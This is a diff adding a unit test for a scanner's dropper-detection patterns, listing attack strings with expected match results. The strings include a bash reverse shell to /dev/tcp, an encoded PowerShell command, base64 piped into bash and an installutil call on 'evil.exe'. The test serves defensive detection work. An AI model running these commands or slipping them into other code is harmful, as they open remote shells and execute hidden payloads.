@@ -619,3 +619,28 @@ def test_cli_r8_jailbreak_templates_detected(tmp_path):
         hits = [(w, d) for p, w, d in pi if p.search(text)]
         matched = bool(hits)
         assert matched == expected, f"CLI R8 jailbreak '{desc}': expected={expected} got={matched} text={text!r}"
+
+
+def test_cli_r9_dropper_patterns(tmp_path):
+    """PT-T238 R9: Advanced dropper patterns work in CLI."""
+    import skillsmith.scan as s
+    dp = s._DROPPER_PATTERNS
+    
+    cases = [
+        ("bash -i >& /dev/tcp/10.0.0.1/4242 0>&1", True, "Bash reverse shell"),
+        ("powershell -enc SQBFAFgAIAAoAA==", True, "PowerShell encoded"),
+        ("echo dGVzdA== | base64 -d | bash", True, "Base64 pipe to bash"),
+        ('require("child_process").exec("ls")', True, "Node child_process"),
+        ("os/exec.Command('bash')", True, "Go exec dropper"),
+        ("FromBase64String(payload)", True, ".NET FromBase64String"),
+        ("System.Net.WebClient()", True, ".NET WebClient"),
+        ("Add-Type -TypeDefinition $code", True, "PowerShell Add-Type"),
+        ("installutil /i evil.exe", True, "InstallUtil"),
+        ("Use Python for data", False, "Benign Python"),
+        ("curl -o file.txt https://example.com", False, "Benign curl"),
+    ]
+    
+    for text, expected, desc in cases:
+        hits = [(w, d) for p, w, d in dp if p.search(text)]
+        matched = bool(hits)
+        assert matched == expected, f"CLI R9 dropper '{desc}': expected={expected} got={matched} text={text!r}"
